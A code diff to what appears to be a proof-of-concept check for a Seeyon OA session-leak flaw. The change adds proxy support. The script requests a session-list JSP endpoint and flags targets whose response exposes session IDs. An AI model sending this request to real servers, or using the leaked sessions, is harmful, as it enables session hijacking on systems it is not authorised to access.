@@ -2,9 +2,11 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-from Config.config_requests import  headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import  headers
+
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='Seeyon_OA_Session_Leak'
@@ -17,8 +19,8 @@ def poc(target):
     result = {}
     vuln_url = target + "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5)
+
+        r = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5,proxies=proxies)
         if "/yyoa/index.jsp" not in r.text and "<sessionID>" in r.text and r.status_code == 200:
             result['target'] = target
             result['poc'] = NAME
